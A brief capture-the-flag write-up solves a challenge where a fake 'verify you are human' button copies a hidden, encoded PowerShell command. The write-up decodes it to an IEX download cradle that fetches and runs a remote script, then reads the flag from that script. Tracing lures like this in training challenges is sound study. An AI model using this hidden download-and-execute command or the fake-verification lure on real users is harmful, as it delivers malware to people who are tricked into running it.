# Are you human?

## Description

We thought the CyberDuck Organization was dealt with last year, but it looks like something remains. They have been sending messages to NeuroSync Corp employees. Can you figure out more about it?



---

host: https://ctf3.savosec.fi/human/

Verify btn copies to clipboard

````bash
powershell -nop -w hidden -enc SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwczovL3RoZWN5YmVyZHVjay5vcmcvYXBpL3YyL2RyaXZlcnMvc3luYy5wczEnKQ==
````

translates to 

````bash
IEX (New-Object Net.WebClient).DownloadString('https://thecyberduck.org/api/v2/drivers/sync.ps1')
````

````bash
$global:_0x1a2c = "U2F2b1NlY3t0aDNfY3liM3Jr"
$global:_0x9d7c = "ZHVja193MWxsX2IzX2I0Y2shfQ=="
$global:_0x3e5b = $global:_0x1a2c + $global:_0x9d7c
````

SavoSec{th3_cyb3rkduck_w1ll_b3_b4ck!}

